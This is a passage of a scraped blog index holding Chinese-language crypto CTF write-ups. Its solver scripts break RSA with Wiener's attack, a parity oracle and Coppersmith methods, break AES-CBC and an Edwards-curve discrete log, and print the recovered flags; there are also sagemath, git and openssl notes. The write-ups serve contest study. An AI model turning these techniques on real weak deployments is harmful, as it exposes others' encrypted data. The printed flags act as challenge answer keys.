\u0026#39;0\u0026#39;)\r# key = \u0026#39;00101010010000\u0026#39;\rm = []\rl = []\rfor i in range(8):\rfor j in range(i, i+7):\r# print(j,end=\u0026#39; \u0026#39;)\rl.append(int(key[j]))\rl.append(1)\rm.append(l)\rl = []\r# for i in m:\r# print(i)\r# ============\r# get_x(c, m, _)\rtry:\rget_x(c, m, _)\rexcept:\rcontinue\r# *CTF{yOuG0t1T!} myCurve # 二元爱德华兹曲线（Binary Edwards Curves）\n反正🧓也没打算大二完全搞明白这种数学👴玩的玩意\nsage\nfrom Crypto.Util.number import * def To_Birational(point): x, y = point return (3*(x+y)) / (x*y + x + y), 3*(x / (x*y+x+y) + 2) F=GF(2**100) R.\u0026lt;x,y\u0026gt;=F[] d1=F.fetch_int(1) d2=F.fetch_int(1) x,y=(698546134536218110797266045394L, 1234575357354908313123830206394L) G=(F.fetch_int(x),F.fetch_int(y)) x, y = (403494114976379491717836688842L, 915160228101530700618267188624L) P =(F.fetch_int(x),F.fetch_int(y)) G = To_Birational(G) P = To_Birational(P) E = EllipticCurve(GF(2**100), [1, 2, 0, 0, 3]) G = E(G) P = E(P) flag = G.discrete_log(P) print(long_to_bytes(flag)) 爱德华曲线运算在区块链中应用广泛\nlittle case # 先用维纳解p的值，再尝试把$\\phi(n)$分解，瞬间出来两个4500左右的值和一个很大的解不动的值，nctf2019有一个题有这个开方脚本，这个题 e 的大小甚至和nctf2019那个题是一样的。。。。\n当时完全没有注意到去检查参数长度。。。太拉了。。。满脑子LLL\n","date":"5 January 2021","permalink":"/achieve/ctf/starctf/","section":"archive","summary":"*ctf2021 # myenc # ct=iv for i in range(1,8): if keystream[cnt]==\u0026#39;1\u0026#39;: ct+=pow(m^q,i**i**i,n) ct%=n cnt=(cnt+1)%len(keystream) print(\u0026#34;done:\u0026#34;,ct) 主要难点在这里","title":"star CTF2021"},{"content":"\r一个逆向 # 解题思路逐渐离谱 \u0026mdash;- pandaos\nmain # from data import sums def tolist(m): l = list(list(m)[0]) return l def xor(a,b): return eval(\u0026#34;%s^%s\u0026#34; % (a, b)) def xorl(a, b): return [xor(a[i],b[i]) for i in range(42)] def slove_flag(enc,m): enc = matrix(42, enc) m = matrix(42, 42, m) flag = m ^ (-1)*enc flag = (tolist(flag.T)) flag = xorl(flag, xordata) return flag xordata = [0xA0, 0xE4, 0xBA, 0xFB, 0x10, 0xDD, 0xAC, 0x65, 0x8D, 0x0B, 0x57, 0x1A, 0xE4, 0x28, 0x96, 0xB3, 0x0C, 0x79, 0x4D, 0x80, 0x90, 0x99, 0x58, 0xFE, 0x50, 0xD3, 0xF9, 0x3C, 0x0F, 0xC1, 0xE3, 0xA6, 0x39, 0xC3, 0x28, 0x75, 0xF8, 0xC9, 0xC8, 0xCD, 0x78, 0x26] enc = [775008, 736965, 579982, 832102, 739711, 689694, 621261, 786007, 687380, 870278, 671072, 705346, 695702, 726075, 693811, 726115, 797388, 839688, 798029, 773858, 732406, 632966, 740936, 775656, 710214, 858672, 686622, 608896, 815068, 521720, 693197, 560581, 885102, 635306, 732285, 770318, 702253, 632762, 839978, 813599, 651986, 875709] print(enc ans=[] for i in range(0x100): try: flag = bytes(slove_flag(enc,sums[i])) print(flag) ans.append(flag) except: continue print(ans) # b\u0026#39;flag{94bb46eb-a0a2-4a4a-a3d5-2ba877deb448}\u0026#39; data # 利用srand(x)函数生成x=0~0xff的所有随机数数据\n数据来源鸣谢 : c0rrsx2@syclover\n数据：\rdata.py\n","date":"27 December 2020","permalink":"/achieve/2019to2021/huawei-xctf-sth/","section":"archive","summary":"一个逆向 # 解题思路逐渐离谱 \u0026mdash;- pandaos","title":"一点好玩的东西"},{"content":"做了一点微小的工作\nwp # 爆破 # python\nfrom itertools import product import hashlib import string tab = string.ascii_lowercase + string.digits print(tab) tab = \u0026#39;abcdef0123456789\u0026#39; for i in product(tab,repeat=6): s = \u0026#39;\u0026#39;.join(i) # print(s) broken_flag = \u0026#39;d0g3{71b2b5616\u0026#39;+s[:2]+\u0026#39;2a4639\u0026#39;+s[2:4]+\u0026#39;7d979\u0026#39;+s[4:]+\u0026#39;de964c}\u0026#39; s = bytes(broken_flag, encoding=\u0026#39;utf-8\u0026#39;) ciphier = hashlib.sha256(s).hexdigest() if ciphier == \u0026#39;0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a\u0026#39;: print(broken_flag) exit() # d0g3{71b2b5616ee2a4639a07d979ebde964c} aes # get key\nIn [4]: a = 0x7d3424647d3424647d3424647d342464\rIn [5]: b = 0x19044357064341081e5b4901045b5119\rIn [6]: from Crypto.Util.number import *\rIn [7]: long_to_bytes(a^b)\rOut[7]: b'd0g3{welcomeyou}'\rpython\nfrom Crypto.Util.number import * from Crypto.Cipher import AES from itertools import product msg = b\u0026#39;Welcome to this competition, I hope you can have fun today!!!!!!\u0026#39; m = [] for i in range(0,len(msg)-1,16): # print(msg[i: i+16]) m.append(msg[i:i+16]) print(m[i//16]) c4 = b\u0026#39;\u0026lt;\\x97l\\x92\\xaf\\xf4\\tZ#\\xe8\\x85\\xb1\\x95\\x07{f\u0026#39; key = b\u0026#39;d0g3{welcomeyou}\u0026#39; aes = AES.new(key, AES.MODE_ECB) M4 = aes.decrypt(c4) # ----------------------------- c3 = b\u0026#39;\u0026#39; for i in range(16): c3 += bytes([m[3][i]^M4[i]]) print(\u0026#39;c3\u0026#39;,c3) M3 = aes.decrypt(c3) # ----------------------------------------- c2 = b\u0026#39;\u0026#39; for i in range(16): c2 += bytes([m[2][i] ^ M3[i]]) print(\u0026#39;c2\u0026#39;, c2) M2 = aes.decrypt(c2) # --------------------------------- c1 = b\u0026#39;\u0026#39; for i in range(16): c1 += bytes([m[1][i] ^ M2[i]]) print(\u0026#39;c2\u0026#39;, c1) M1 = aes.decrypt(c1) # --------------------------------------- flag = b\u0026#39;\u0026#39; for i in range(16): flag += bytes([m[0][i] ^ M1[i]]) print(\u0026#39;flag\u0026#39;, flag) # aEs_1s_SO0o_e4sY # b\u0026#39;\\xf7f\\xe2A\\xd4\\x1d\\x87Qr\\x97c\\xbe\\xc9\u0026#34;\\xad\\xdf\u0026#39; rsa # challenge1 # from Crypto.Util.number import * from gmpy2 import * hint1 = 134805774328615624446574490322803283547316698647214138487576352482438867186094276263735342558169004773286779632939369099910639984165263724781958841009573156241531958373198729926012152201548649349842790727259831232277600944618096069835436884888782994513452252257103877595707828731260669076400456300668581565291455061609385003064649522735776446930209884653223939689686840631001863143579575759834304817613040932998629846110770749941179601474484275548912570668460216633586988225562794026430881265344731575650165992321629617982004131413202026628777742093026476064486873565664625105013298396598413667761372217260994853420062861590358 # hint1 = 2 * d + 246810 * e * phi e = 54347 m = 2 n = 10050095014547257781432719892909820612730955980465259676378711053379530637537082959157449310691856567584792956476780977871348290765339769265796235196183464082153542864869953748019765139619014752579378866972354738500054872580260903258315293588496063613299656519940131695232458799137629873477475091085854962677524091351680654318535417344913749322340318860437103597983101958967342493037991934758199221146242955689392875557192192462927253635018175615991531184323989958707271442555251694945958064367263082416655380103916187441214474502905504694440020491633862067243768930954759333735863069851757070183172950390134463839187 a = 67402887164307812223287245161401641773658349323607069243788176241219433593047138131867671279084502386643389816469684549955319992082631862390979420504786578120765979186599364963006076100774324674921395363629915616138800472309048034917718442444391497256726126128551938797853914365630334538200228150334290782645727530804692501532324761367888223465104942326611969844843420315500931571789787879917152408806520466499314923055385374970589800737242137774456285334230108316793494112781397013215440632672365787825082996160814808991002065706601013314388871046513238032243436782832312552506649198299206833880686108630497426710031430795179 # 32768 print(pow(m, e*a, n)) \u0026#39;\u0026#39;\u0026#39; for e in range(50000, 65536+50): E = a*e if(e%1000==0): print(e) if pow(m,E,n) == m: print(e) break \u0026#39;\u0026#39;\u0026#39; e = 54347 a = 67402887164307812223287245161401641773658349323607069243788176241219433593047138131867671279084502386643389816469684549955319992082631862390979420504786578120765979186599364963006076100774324674921395363629915616138800472309048034917718442444391497256726126128551938797853914365630334538200228150334290782645727530804692501532324761367888223465104942326611969844843420315500931571789787879917152408806520466499314923055385374970589800737242137774456285334230108316793494112781397013215440632672365787825082996160814808991002065706601013314388871046513238032243436782832312552506649198299206833880686108630497426710031430795179 k_ = (e*a-1)//n print(k_) K_ = 364488564875886 h = a*e-1 for k1 in range(K_, K_+0xffff): if(h % k1 == 0): print(k1) print(\u0026#39;phi\u0026#39;, h//k1) # ----------------------------------------------- n = 10050095014547257781432719892909820612730955980465259676378711053379530637537082959157449310691856567584792956476780977871348290765339769265796235196183464082153542864869953748019765139619014752579378866972354738500054872580260903258315293588496063613299656519940131695232458799137629873477475091085854962677524091351680654318535417344913749322340318860437103597983101958967342493037991934758199221146242955689392875557192192462927253635018175615991531184323989958707271442555251694945958064367263082416655380103916187441214474502905504694440020491633862067243768930954759333735863069851757070183172950390134463839187 c = 522627051172673216607019738378749874116772877858344748349627321977492158105699887369893079581450048789131578556338186004983533975454988450450635141267157135506032849129152411194539350100279698888357898902460651973610161382266600081865609650174137113252711515464274593530115825189780860732147803369868525723790644619452538755225868382505974710418995847979384726953915873857530098330095151094837190566851416540540805185485212577333604309698822785682707412587829684108913753204398552196441996201678339688766979634246337855516220753995430266970473808724410357458278585135750810810484678948146374963838334596646926215341 hint1 = 134805774328615624446574490322803283547316698647214138487576352482438867186094276263735342558169004773286779632939369099910639984165263724781958841009573156241531958373198729926012152201548649349842790727259831232277600944618096069835436884888782994513452252257103877595707828731260669076400456300668581565291455061609385003064649522735776446930209884653223939689686840631001863143579575759834304817613040932998629846110770749941179601474484275548912570668460216633586988225562794026430881265344731575650165992321629617982004131413202026628777742093026476064486873565664625105013298396598413667761372217260994853420062861590358 phi = 10050095014547257781432719892909820612730955980465259676378711053379530637537082959157449310691856567584792956476780977871348290765339769265796235196183464082153542864869953748019765139619014752579378866972354738500054872580260903258315293588496063613299656519940131695232458799137629873477475091085854962677323144827364421857064114743919112397586714682327717591155281859878332878857637496812871055648464124306714796343117986409422875990360904379592919915948034655684834583955582963750039237702158594138221579562115747934168692201112328903250356981525515082719838720587009453696563480137185036274540174814218515651176 e = 54347 d = 4298016603089542483597241351887133616963086810642235365308002324004030601093655254875842951388303500539234141616526091370008960457210644879673875254010268684516397285320394226203385308757155700948533012423343861339508626943721344573385174040587806327861898850653183080217726965785724943775433346219983458931428497103383883062577219623496568538184452180371700595315860323243090009943680620842452188260283054761747020012268354097333918776896022588008512791625374380691241934242840621257445893290771708557244115630719160459380439474823867892787914640451469658906186018434932447473007312369559582186557910152024338800019 m = 234702123 print(pow(123,e*d,n)) print((pow(c,d,n))) # 234702123 challenge 2 # from Crypto.Util.number import * from gmpy2 import * m = 234702123 # 3 × 78 234041 m1 = 3 m2 = 78234041 p = 689159326758330864205993810270646658558112329195746149991184055909755461246626153920231796960903018393806410715812453949253930576368274228434916375544579284365205241766136566047482065208442992856658212126772417415403473480889927931481129434854332858754668120563818975006384512615022532233244596546830392476321031156328699572283946257730515089543367929326280871305776349305346159311591820455943842203357066465523558715870586535188343603460826231817622511283563179065036619023415848694281294463836320838105950552498785365535923041927491743402053568747113507098917091780797009380675587381805253390649630338055131031679595664055361678114747608302944715308343764678875659039394225950479683967885912291399162609094622980318391045105733088508798371414996479107970975717563552614856114065668728607215268431341079233630995168600896375314067716366181300081684353583326214062788182429536300917720999423489104723824360299238754986351169209709892739317096741609428484854087163771300777717883057028145424827875496235567904291417092378448353222179114362314382900648079547647848024440220204768433974038004942869937932015294078073975703156613070125753344841550872429670559866184492945262960524545894823245933714684747784492095876370443994948425495841 q = 825745527393875213112416399161876312807690899587680405323661594634206777626830009225425708368452900127898718079772635289577153999013886667961217430074282603941419231606982549262875927598587116257227403646863891999503669499691226452373375235370860079746071677621652251885930328523487781646712042859931782618220703334721235289166285140690745773731238255224060549452664943877872987321262039002730465087234720391689961341109105478873987526603600402429600189003498632775079541462166163941851848765036872700541100390593375609399046693728399625801469156502270197170371875324720480650306785436605155686110619524005509832014145815734269685871332335544226747535167347621137129026799054475196918117687928602288868853220954790928729951229529274652854752754075975718778340195177601007255969037312694713797288603741759269754480872584968304627973646008573027346743614653988753674721004169739334587145202207452102165404828315977860122216069411238549765007288548786956279851184761238592429597293858204186200925553719690039361569082671701947951613715432578165026545428849347274156827008272891661068698821932170724135412872216787954099301438985821980885240717232218707592014222715174630839806063753862210894420887328995052744595750340725332465581373047 e = 0x10001 n = 133561991523711714238641512987809330530212246892569593026319411449791084194115873781301422593495806927875828290629679020098834182528012835469352471635087375406306534880352693134486855968468946334439553553593196889196239169351375517588892769598963002098115826389220099548938169095670740942251209102500450728442583559710183771974489284632651296188035458586935211952691589627681567274801028577256215269233875203212438263987034556969968774119389693056239796736659926866707857937025200924828822267781445721099763436020785585453958594470906716195030613615725126057391084801585533926767137218524047259398886392592317910204988634868663634415285507325190415658931169841182499733179254162060738994027842088553562013488445789594342451823783136881968032197575016845492231433684884872631894561254381663562267075103417879327236182565223877901300392217967589154857009356640377622996801781797109089687661697856930394706016954531077165127402008444818092498106642068414208190583373314287381712963712098566595399301400378116274132918572709221391531621228936206630829355801192700264684469488261781954165940553346889395507153750291402535330239420975542926664420153925171757944018621411265539452424569343708318070259746118326558005521868356304582694159507379335214599839668805877215983938986674084063185863612335339836810044252829401409522709997562887276661672718820881541500852400369184737236082178767653725044900394959369367604992512713490494168594433000695046297712977059205623777990102604073885527049867682390577577616773090662829024271568456346362315351643767420198116229892060385453123572533267805396437865025639093881944841521458804810097550625853182396288247815370818578103543117466070812804267915674186488979548392193291727228018246788487524292081389142018151246889408421936865224469589631518283230229213787648552632437566756058034131355439709320923876063030896228165897498746898125821639893238387694549304110003941329763552493326245073779912107372271854798616245416264801377068163622812994786201580895459712414134184992440395336131037558976058298521312536969408724436512019410835904564817724243688308776888170183074838453466914170790840559860531933430176605716828492670093771129301541861534595181565621644268739349035133062776852304594204220291667924128313579203359827093150911871520605180797438668872585571501531844999598674037998642821148417473110716470439750642781609483016636419373004760601783594025036152924259863627732874940148083408474700265895269165869619971810103499607445649821 c = 65553658155452064459040687299632299415295760116470555100400688788937893101658136830409082198753928673469636810831761104117535054304536941814523449491308187105740319828511969750359402834799486354958723098881095067882833993358468923611118977258293638107874383059048015701807718209929028151240509801801995570592890519253676774278321334154528938199389248563657673061299152526380072934917964488153875744843855913524788571997024947738868563951687976817548296078497817264410193882661874749304071168979787307490320366615899942861059615405569154961435894469325778407081182151320629413711622905703628430999201763846682516985530373643176026602901129520439581385946775511292435206913016381293219606333035648747877313424616408338829137581998558399694071257787294948211441360283876078405831210625321012072477187438320944119825970347654743794743846351762763177440045084761025728597526592892602263484022280653040195670941221493307430623213388669939114424884078502946247136016528925968280034099568454876076717790529204207317485416329062672971939549478648687894958552760953682796211975576320713576155031581257782352223857605149825435939889497465805857339911597479498085071301601506276220487493620870555545057189236870008182212284992968466451864806648279032294546676543599599279519394341289357968292292966055189578253350591765186079486142930848439238134776982658066494378507873003509820326863340562093906137812952544399266821679905073464535234547335867090392493005792528534561846391285698943396889671437127470587837989050518266365099789392584686615435440486086402941357614369171354355307532351370775920044953381482310949663868493911752104873824099597326393857349237228788875273525189373323552519106738497767546337587947368062413334887230166285909705065920918078052826480092129173127887307158867274895914733110276134124505178182548094607594799978378381804502097507167978950926067243870989514735314054362049917668015341349933704885009878192354865067520219676784278082055728039064858769077997521541853184489175120623176481708269464933868222226748491078319156602229948646960513946846417957356535995079525993783278312017766715177078804065822913241465133977233398851120059496221650357891946344151601586169979516826622503491746992282716591488199657450776596383692706657692673860134555990821730412919497018889046615548520878486492644159735144935329502984929679831356967030870226422768447430410031028770529758721438528263719267616233686813781828066547393953352033364851486926368090757420184816634373721 # print(p*q*m) # c = pow(123, e, n) phi = (p-1)*(m1-1)*(q-1)*(m2-1) d = invert(e, phi) print(long_to_bytes(pow(c, d, n))) # 11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047 challenge3 # from Crypto.Util.number import * n = 14857387925078594782296815160632343246361073432459148990826882280149636079353743233970188012712079179396872746334143946166398665205889211414809061990804629906990919975187761209638578624750977626427334126665295876888197889611807587476285991599511809796600855689969285611439780660503760599419522224129074956376232480894299044645423966132497814477710701209588359243945406653547034819927990978087967107865071898215805154003530311865483912924517801551052430227039259201082691698480830966567550828053196299423168934840697637891311424286534363837640448614727396254288829197614805073711893711252067987576745683317789020760081 c = 14035143725862612299576867857272911865951893239411969382153274945929406881665641140566462510177132511558933111728871930062074990934496715765999564244916409345156132996227113853067808126894818934327468582686975383715892108247084995817427624992232755966398834682079985297050358462588989699096264155802168300026093598601350106309023915300973067720164567785360383234519093637882582163398344514810028120555511836375795523327469278186235781844951253058134566846816114359878325011207064300185611905609820210904126312524631330083758585084521500322528017455972299008481301204209945411774541553636405290572228575790342839240414 x = 675003330981130439478093707252121278358852500850751357 M = 11239443406846515682004397310032293056196968050880696884154193656922259582646354037672076691689208477252910368708578177585615543361661522949580970926775441873118707711939955434559752380028881505457190152150478041765407640575502385319246850488337861927516356807100066882854088505873269444400308838674080495033363033991690519164414435127535585042743674610057871427247713644547353814013986225161074642240309387099685117406015368485154286173113005157000515600312732288515034433615484030112726976498694980213882676667079898254165734852012201534408980237760171665298653255766622300299965621344582683558980205175837414319653422202527631026998128129244251471772428535748417136102640398417683727976117490109918895485047000000000000000000000000000000000000000000000000000000 e = 5 c = pow(M+x, e, n) print(c) print(long_to_bytes(M+x)) # d0g3{e173c0f114c59c2bdea69c67422be407} 求x用这个脚本\nsagemath github 对M,C,N,e,beta做好限制就欧克了\n","date":"26 November 2020","permalink":"/achieve/2019to2021/%E5%AE%89%E5%AF%BBwp/","section":"archive","summary":"做了一点微小的工作","title":"安寻wp"},{"content":"🧓第一次打翔☁🧺，被迫读了一篇论文，晚上恰🔥锅想到了第二个脑残题，本来想着晚上来激情LLL结果被队友背刺了，\n想问一下某些队是怎么突然脑子开窍了一小时之内一起学会LLL了吗？\n放个sb wp以明悲愤之情\nsimpleRSA # sage\nfrom Crypto.Util.number import * e = 1072295425944136507039938677101442481213519408125148233880442849206353379681989305000570387093152236263203395726974692959819315410781180094216209100069530791407495510882640781920564732214327898099944792714253622047873152630438060151644601786843683746256407925709702163565141004356238879406385566586704226148537863811717298966607314747737551724379516675376634771455883976069007134218982435170160647848549412289128982070647832774446345062489374092673169618836701679 n = 1827221992692849179244069834273816565714276505305246103435962887461520381709739927223055239953965182451252194768935702628056587034173800605827424043281673183606478736189927377745575379908876456485016832416806029254972769617393560238494326078940842295153029285394491783712384990125100774596477064482280829407856014835231711788990066676534414414741067759564102331614666713797073811245099512130528600464099492734671689084990036077860042238454908960841595107122933173 c = 1079929174110820494059355415059104229905268763089157771374657932646711017488701536460687319648362549563313125268069722412148023885626962640915852317297916421725818077814237292807218952574111141918158391190621362508862842932945783059181952614317289116405878741758913351697905289993651105968169193211242144991434715552952340791545323270065763529865010326192824334684413212357708275259096202509042838081150055727650443887438253964607414944245877904002580997866300452 m = 12345 c1 = pow(m, e, n) list1 = continued_fraction(Integer(e)/Integer(n)) conv = list1.convergents() for i in conv: d = int(i.denominator()) m1 = pow(c1, d, n) if m1 == m: print(d) break print(long_to_bytes(pow(c,d,n))) # b\u0026#39;flag{1c40fa8a-6a9c-4243-bd83-cd4875ea88cc}\u0026#39; more_calc # 这个题吃饭的时候突然想起这么做了，然后回器那电脑的时候发现被ban了😁\n$m^e \\equiv c;mod;q*p$\n$m^e \\equiv c\\equiv c_1;mod;p$\n如果 $p\u0026gt;m$(一般是大于的)\n$e*d\\equiv1;mod;p$\n$c^d\\equiv m^{ed}\\equiv m ;mod;n$\nsage\nimport gmpy2 from Crypto.Util.number import * p = 27405107041753266489145388621858169511872996622765267064868542117269875531364939896671662734188734825462948115530667205007939029215517180761866791579330410449202307248373229224662232822180397215721163369151115019770596528704719472424551024516928606584975793350814943997731939996459959720826025110179216477709373849945411483731524831284895024319654509286305913312306154387754998813276562173335189450448233216133842189148761197948559529960144453513191372254902031168755165124218783504740834442379363311489108732216051566953498279198537794620521800773917228002402970358087033504897205021881295154046656335865303621793069 c = 350559186837488832821747843236518135605207376031858002274245004287622649330215113818719954185397072838014144973032329600905419861908678328971318153205085007743269253957395282420325663132161022100365481003745940818974280988045034204540385744572806102552420428326265541925346702843693366991753468220300070888651732502520797002707248604275755144713421649971492440442052470723153111156457558558362147002004646136522011344261017461901953583462467622428810167107079281190209731251995976003352201766861887320739990258601550606005388872967825179626176714503475557883810543445555390014562686801894528311600623156984829864743222963877167099892926717479789226681810584894066635076755996423203380493776130488170859798745677727810528672150350333480506424506676127108526488370011099147698875070043925524217837379654168009179798131378352623177947753192948012574831777413729910050668759007704596447625484384743880766558428224371417726480372362810572395522725083798926133468409600491925317437998458582723897120786458219630275616949619564099733542766297770682044561605344090394777570973725211713076201846942438883897078408067779325471589907041186423781580046903588316958615443196819133852367565049467076710376395085898875495653237178198379421129086523 e = 0x10001 d = inverse(e,p-1) print(long_to_bytes(pow(c,d,p))) # b\u0026#39;flag{3d7f8da9-ee79-43c0-8535-6af524236ca1}\u0026#39; ","date":"25 November 2020","permalink":"/achieve/2019to2021/%E7%BF%94%E4%BA%91/","section":"archive","summary":"🧓第一次打翔☁🧺，被迫读了一篇论文，晚上恰🔥锅想到了第二个脑残题，本来想着晚上来激情LLL结果被队友背刺了，","title":"翔云"},{"content":"#整数域,有理数域和实数域 ZZ(3) QQ(0.25) RR(2^0.5) #复数域 CC(1,2) #生成虚数单位i i=ComplexField().gen();(2+i)*(4+3*i) #构造多项式环,返回具有给定属性和变量名的全局唯一的单变量或多元多项式环 #定义在整数域上的多项式环R，变量为w;ZZ也可换成其他数域 R.\u0026lt;w\u0026gt;=PolynomialRing(ZZ);R (1 + w)^3 #有限环 FR=Integers(17);FR #自身的代数扩展;exR=FR[w]/(w^2+3) exR=FR.extension(w^2+3)；exR #以python整数的形式返回所有可逆元素的列表 FR.list_of_elements_of_multiplicative_group() #假设环的乘法群是循环的，返回这个环的乘法群的生成元 FR.multiplicative_generator() #返回这个环的一个随机元素 FR.random_element() #上述几种方法对如下的域同样支持 #有限域 #素数域 G1=GF(37);G1 #伽罗瓦域 G2=GF(3^5);G2 # ans = c mod n 中国剩余定理扩展梭哈函数 # return ans, 通解的 ans+k*N (N = lcm([n1~ni])) crt(c,n) ","date":"24 November 2020","permalink":"/achieve/2019to2021/sagemath/","section":"archive","summary":"#整数域,有理数域和实数域 ZZ(3) QQ(0.","title":"sagemath基础"},{"content":" 周五打了个电信的破比赛，本来从教室赶回来只剩一个半小时了，刚写好exp服务器有炸了， 一气之下直接吃饭 :( 晚上7点才打到flag\nRSA parity oracle # RSA parity oracle选择密文攻击的一种，可以解得密文，原理是二分法和模运算的性质，大比赛里面还没怎么见过直接扒wiki打法来出题的（逗比星盟除外）,利用条件也比较苛\n核心二分 # wiki\nlb = 0\rub = N\rif server returns 1\rlb = (lb+ub)/2\relse:\rub = (lb+ub)/2\rexp及其附件 # 附赠一个临时写的垃圾的socket类\ngithub\n","date":"8 November 2020","permalink":"/achieve/2019to2021/%E7%94%B5%E4%BF%A1/","section":"archive","summary":"周五打了个电信的破比赛，本来从教室赶回来只剩一个半小时了，刚写好exp服务器有炸了， 一气之下直接吃饭 :( 晚上7点才打到flag","title":"socket快乐无边"},{"content":" 又是不记一下立马就会忘的东西\n下载 # git clone https://github.com/ljahum/xxxxxxxx 更新上传 # 向文件夹内传入新文件后\n更新.git\ngit add . 添加备注\ngit commit -m \u0026quot;frist commit\u0026quot; Pash回原来的位置（我这里是main）\ngit push -u origin main ","date":"5 November 2020","permalink":"/achieve/2019to2021/github%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/","section":"archive","summary":"又是不记一下立马就会忘的东西","title":"Github基本使用"},{"content":"\rNOiSE 2021-1-19更新 # CRT 同余式性质及其应用 $$ \\begin{aligned} n_i\\times r_i\\equiv c_i mod ;s \\\\ n_i r_i= c_i +k_is \\end{aligned} $$\n$r_i\u0026lt;s$\n可以选取n的值得到\n$n_i r_i= c_i +s$\n$-c_i= s; mod;n_i$\nCRT得解 # ⑧说了，学到很多\nWP\nnoise # 题目附件\rserver\n这个题核心点在这段代码上\nprint(num * getrandbits(992) % secret) num是输入，乘上一个992bits的随机数后返回模上 secret 的结果。\n于是我们可以得到下式：\n$n_i\\cdot\\ g_i\\equiv c_i ;mod ;m$\n$n_i\\cdot\\ g_i=c_i+k\\cdot m$\n则有\n$0\\equiv c_i+k\\cdot m; mod ;n_i$\n若$k=1$则有下式\n$n_i-c_i\\equiv m;mod;n_i$\n若能求出多个上述式子，则有几率使用中国剩余定理求出$m$\n整点概率的东西 # 要$k=1$则需要$m\u0026lt;n_i\\cdot g_i\u0026lt;2m$,因为$g,m$有固定的bit长度，想怼参数取对数分析：\n$m,g$均有二分之一的概率分别大于$2^{1024},2^{992}$,当满足改条件时，设：\n$$ log(m)=2^{1024}\\cdot 2^\\gamma, log(n)=2^{32}\\cdot 2^\\beta , log(g)=2^{992}\\cdot 2^\\alpha $$\n可得下式：\n$$ \\gamma\u0026lt;\\beta\\cdot\\alpha\u0026lt;\\gamma +1 $$\n已知我们只能控制 $n_i$ 即 $\\beta$，又因为当$\\beta$过小时会有$m\u0026gt;n_i\\cdot g_i$则会出现$c_i=n_i\\cdot g_i$,验证是否过小只需要验证$c_i;mod ;n_i\\neq;0$就ok了\n所以综上，应该将$n_i$控制的尽量小。\n选取 $n$ # 因为我们求出的式子$n_i-c_i\\equiv m;mod;n_i$需要满足CRT的成立条件故所以$n_i$应该均为素数。\n这里用下式生成$n_i$:\npoint = int(sqrt(1.1)*pow(2,32)) ed = pow(2, 16) num = next_prime(getRandomRange(point-ed, point+ed)) 编写代码测试算法 # test.py\n平均测试下来30~40次时可以打通的，在可接受范围内 =v=\n","date":"5 November 2020","permalink":"/achieve/2019to2021/bytectf2020/","section":"archive","summary":"NOiSE 2021-1-19更新 # CRT 同余式性质及其应用 $$ \\begin{aligned} n_i\\times r_i\\equiv c_i mod ;s \\\\ n_i r_i= c_i +k_is \\end{aligned} $$","title":"字节CTF2020"},{"content":" 这种东西不记下来马上就会忘记 openssl下载速度就十分玄学。。。最后要自己配环境变量\nopenssl-rsa 基本使用 # 生成rsa密钥对（私钥） # 生成2048bit长度 包含 e,d,n,q,p,dp,dq openssl genrsa -out privkey.pem 2048\n提取公钥 # 包含 n,e openssl rsa -in privkey.pem -pubout -out pubkey.pem 提取csr证书 # openssl req -new -key privkey.pem -out ca.csr\n提取密钥信息 # 公私钥模数 # openssl rsa -in .\\pubkey.pem -pubout -modulus\nopenssl rsa -in .\\pubkey.pem -pubin -modulus\n提取所有信息 # openssl asn1parse -i -in privkey.pem\n公钥要指定偏移查看，bit string的偏移是19\nopenssl asn1parse -i -in .\\pubkey.pem -strparse 19\npem、der格式转化 # openssl rsa -in .\\private.pem -outform der -out .\\private.der\n除了生孩子什么都能干的python # crypto yyds\nfrom Crypto.PublicKey import RSA\n读取公钥信息 # rsakey = RSA.importKey(open(\u0026#34;public.key\u0026#34;, \u0026#34;r\u0026#34;).read()) n = rsakey.n e = rsakey.e print(\u0026#34;n=%\\ne=%d\u0026#34;,n,e) 生成秘钥对文件 # rsa = RSA.generate(2048) public_key = rsa.publickey().exportKey() f = open(\u0026#34;public_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(public_key.decode()) f.close() private_key = rsa.exportKey() f = open(\u0026#34;private_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(private_key.decode()) f.close() 对文件加解密 # 载入编码方式\nfrom Crypto.Cipher import PKCS1_OAEP\nrsakey=RSA.importKey(open(\u0026#34;public_key.key\u0026#34;,\u0026#34;r\u0026#34;).read()) rsa = PKCS1_OAEP.new(rsakey) encrypt = rsa.encrypt(flag.encode()) rsakey=RSA.importKey(open(\u0026#34;private_key.key\u0026#34;,\u0026#34;r\u0026#34;).read()) rsa = PKCS1_OAEP.new(rsakey) decrypt = rsa.decrypt(f.read()) 算得 n e d q p 生成 private_key.key # rsa_components = (n, e, int(d), p, q) rsa = RSA.construct(rsa_components) public_key = rsa.exportKey() # 此rsa与上文随机生成的rsa相同 f = open(\u0026#34;public_key.key\u0026#34;, \u0026#34;w\u0026#34;) f.write(public_key.decode()) f.close() ","date":"9 October 2020","permalink":"/achieve/2019to2021/openssl-rsa/","section":"archive","summary":"这种东西不记下来马上就会忘记 openssl下载速度就十分玄学。。。最后要自己配环境变量","title":"openssl-rsa和一些有关pem格式秘钥的一些情报"},{"content":" 今天碰巧又做了一遍这个题,除了之前用yafu嗯解，又去参考了一下paper解法\nChallenge Code # from random import choice from Crypto.Util.number import isPrime, sieve_base as primes from flag import flag def getPrime(bits): while True: n = 2 while n.bit_length() \u0026lt; bits: n *= choice(primes) # 前10000个速=素数中随机选一个 if isPrime(n + 1): return n + 1 e = 0x10001 m = int.from_bytes(flag.encode(), \u0026#39;big\u0026#39;) p, q = [getPrime(2048) for _ in range(2)] # q = 素数*素数....*素数 + 1 n = p * q c = pow(m, e, n) # n = 